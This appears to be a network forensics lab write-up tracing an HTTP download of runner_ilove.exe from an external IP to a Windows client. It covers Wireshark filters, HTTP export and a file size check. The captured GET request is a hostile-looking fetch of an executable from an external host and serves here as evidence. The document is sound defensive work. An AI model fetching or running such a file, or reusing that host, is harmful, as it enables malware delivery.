# 03 – Suspicious HTTP Traffic and File Extraction

## Objective

Investigate suspicious external network communication and identify whether a Windows executable was transferred to the internal Windows client.

## Network Indicators

| Attribute | Value |
|---|---|
| Internal client | 10.10.1.128 |
| External server | 107.175.82.242 |
| Destination port | 9000 |
| Protocol | TCP |
| Application protocol | HTTP |

## Step 1 – Investigate TCP Communication

**Wireshark display filter:**

```text
ip.addr == 107.175.82.242 && tcp.port == 9000
```

Examined the TCP communication between the internal Windows client and the external server.

Identified the TCP three-way handshake:

1. SYN
2. SYN-ACK
3. ACK

This established that a TCP connection was successfully initiated.

## Step 2 – Analyse HTTP Traffic

**Wireshark display filter:**

```text
ip.addr == 107.175.82.242 && tcp.port == 9000 && http
```

Identified the following HTTP request:

```http
GET /wilow/runner_ilove.exe HTTP/1.1
Host: 107.175.82.242:9000
User-Agent: curl/8.2.1
```

The server responded with:

```http
HTTP/1.1 200 OK
Content-Length: 1646592
Content-Type: binary/octet-stream
```

### Observations

- The client requested a Windows executable.
- The server returned HTTP 200 OK.
- The response contained 1,646,592 bytes.
- The response data contained the `MZ` executable signature.

## Step 3 – Extract the Executable

Used Wireshark's:

**File → Export Objects → HTTP**

Located and extracted:

`runner_ilove.exe`

The executable was saved locally for further inspection.

## Step 4 – Verify the Extracted File

Used PowerShell to inspect the extracted file size.

```powershell
Get-Item .\runner_ilove.exe | Select-Object Name, Length
```

Observed file size:

`1646592 bytes`

This matched the HTTP Content-Length header.

## Investigation Findings

The packet capture shows that the Windows client requested an executable from an external server over HTTP and received a successful HTTP response.

The executable was successfully reconstructed from the captured HTTP traffic.

## Security Considerations

- HTTP does not provide transport encryption.
- An executable download from an unusual external destination warrants investigation.
- A successful HTTP response does not independently prove malware execution.
- The extracted executable was not executed during this investigation.

## Conclusion

The HTTP investigation identified and reconstructed the executable transferred to the Windows client.
